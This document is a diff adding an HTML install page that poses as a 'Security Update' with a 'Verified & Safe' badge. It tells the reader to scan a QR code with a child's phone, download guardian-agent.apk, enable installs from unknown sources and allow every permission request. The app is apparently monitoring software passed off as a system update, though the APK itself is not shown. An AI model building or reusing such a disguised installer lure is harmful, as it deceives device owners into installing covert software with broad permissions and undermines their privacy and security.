@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>System Update</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: 'Roboto', sans-serif;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(20px);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 24px;
+    padding: 40px 28px;
+    max-width: 420px;
+    width: 100%;
+    text-align: center;
+    color: white;
+  }
+  .shield { font-size: 64px; margin-bottom: 16px; animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
+  h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
+  .badge {
+    display: inline-block;
+    background: rgba(74,222,128,0.2);
+    border: 1px solid #4ade80;
+    color: #4ade80;
+    padding: 4px 14px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    margin-bottom: 24px;
+    text-transform: uppercase;
+  }
+  .qr-box {
+    background: white;
+    border-radius: 16px;
+    padding: 20px;
+    margin: 0 auto 24px;
+    width: 220px;
+    height: 220px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  #qr-code { width: 180px; height: 180px; }
+  .url-box {
+    background: rgba(255,255,255,0.08);
+    border-radius: 10px;
+    padding: 12px 16px;
+    font-family: monospace;
+    font-size: 13px;
+    color: #93c5fd;
+    margin-bottom: 24px;
+    word-break: break-all;
+    cursor: pointer;
+    border: 1px solid rgba(147,197,253,0.3);
+  }
+  .url-box:active { background: rgba(255,255,255,0.15); }
+  .steps { text-align: left; margin-bottom: 24px; }
+  .step {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    margin-bottom: 14px;
+  }
+  .step-num {
+    min-width: 28px;
+    height: 28px;
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+    flex-shrink: 0;
+  }
+  .step-text { font-size: 14px; color: rgba(255,255,255,0.85); line-height: 1.5; padding-top: 3px; }
+  .step-text strong { color: white; }
+  .btn {
+    display: block;
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: white;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    text-decoration: none;
+    letter-spacing: 0.5px;
+    transition: transform 0.1s, box-shadow 0.2s;
+    box-shadow: 0 4px 20px rgba(102,126,234,0.4);
+  }
+  .btn:active { transform: scale(0.98); }
+  .size-info {
+    font-size: 12px;
+    color: rgba(255,255,255,0.4);
+    margin-top: 14px;
+  }
+  .copied {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #4ade80;
+    color: #000;
+    padding: 8px 20px;
+    border-radius: 20px;
+    font-weight: 600;
+    font-size: 14px;
+    opacity: 0;
+    transition: opacity 0.3s;
+    pointer-events: none;
+    z-index: 100;
+  }
+  .copied.show { opacity: 1; }
+  /* Mobile: show QR on desktop only, show download button on mobile */
+  .mobile-only { display: none; }
+  .desktop-only { display: block; }
+  @media (max-width: 600px) {
+    .mobile-only { display: block; }
+    .desktop-only { display: none; }
+    .qr-box { display: none; }
+  }
+</style>
+</head>
+<body>
+
+<div class="copied" id="copied">✓ Link copied!</div>
+
+<div class="card">
+  <div class="shield">🛡️</div>
+  <h1>Security Update</h1>
+  <div class="badge">✓ Verified & Safe</div>
+
+  <!-- QR code for desktop viewing -->
+  <div class="desktop-only">
+    <p style="color:rgba(255,255,255,0.6);font-size:13px;margin-bottom:14px;">Scan with child's phone camera:</p>
+    <div class="qr-box">
+      <canvas id="qr-code"></canvas>
+    </div>
+  </div>
+
+  <!-- Direct download for mobile -->
+  <div class="mobile-only">
+    <a id="download-btn" href="/download/guardian-agent.apk" class="btn">
+      ⬇️ Download Security Update
+    </a>
+    <p class="size-info">System Security Service · v1.0 · ~8MB</p>
+  </div>
+
+  <!-- Tap to copy link -->
+  <div class="url-box" onclick="copyLink()" id="url-display">
+    Tap to copy download link
+  </div>
+
+  <div class="steps">
+    <div class="step">
+      <div class="step-num">1</div>
+      <div class="step-text">Scan QR code or tap <strong>Download</strong></div>
+    </div>
+    <div class="step">
+      <div class="step-num">2</div>
+      <div class="step-text">If asked, tap <strong>Settings → Allow from this source</strong></div>
+    </div>
+    <div class="step">
+      <div class="step-num">3</div>
+      <div class="step-text">Open downloaded file → tap <strong>Install</strong></div>
+    </div>
+    <div class="step">
+      <div class="step-num">4</div>
+      <div class="step-text">Tap <strong>Allow</strong> when permissions are requested — required for security features</div>
+    </div>
+  </div>
+</div>
+
+<!-- QR Code library -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+  // Detect current URL and build download link
+  const proto = location.protocol;
+  const host = location.hostname;
+  const port = location.port ? ':' + location.port : '';
+  const downloadUrl = `${proto}//${host}${port}/download/guardian-agent.apk`;
+  const installPage = `${proto}//${host}${port}/install`;
+
+  // Show URL
+  document.getElementById('url-display').textContent = installPage;
+  document.getElementById('download-btn').href = downloadUrl;
+
+  // Generate QR code
+  try {
+    new QRCode(document.getElementById('qr-code'), {
+      text: installPage,
+      width: 180,
+      height: 180,
+      colorDark: '#000000',
+      colorLight: '#ffffff',
+      correctLevel: QRCode.CorrectLevel.H
+    });
+  } catch(e) {
+    document.getElementById('qr-code').parentElement.innerHTML = 
+      '<p style="color:#333;font-size:12px">Scan this URL:<br>' + installPage + '</p>';
+  }
+
+  function copyLink() {
+    navigator.clipboard.writeText(installPage).then(() => {
+      const el = document.getElementById('copied');
+      el.classList.add('show');
+      setTimeout(() => el.classList.remove('show'), 2000);
+    }).catch(() => {
+      // Fallback
+      const ta = document.createElement('textarea');
+      ta.value = installPage;
+      document.body.appendChild(ta);
+      ta.select();
+      document.execCommand('copy');
+      document.body.removeChild(ta);
+    });
+  }
+</script>
+</body>
+</html>
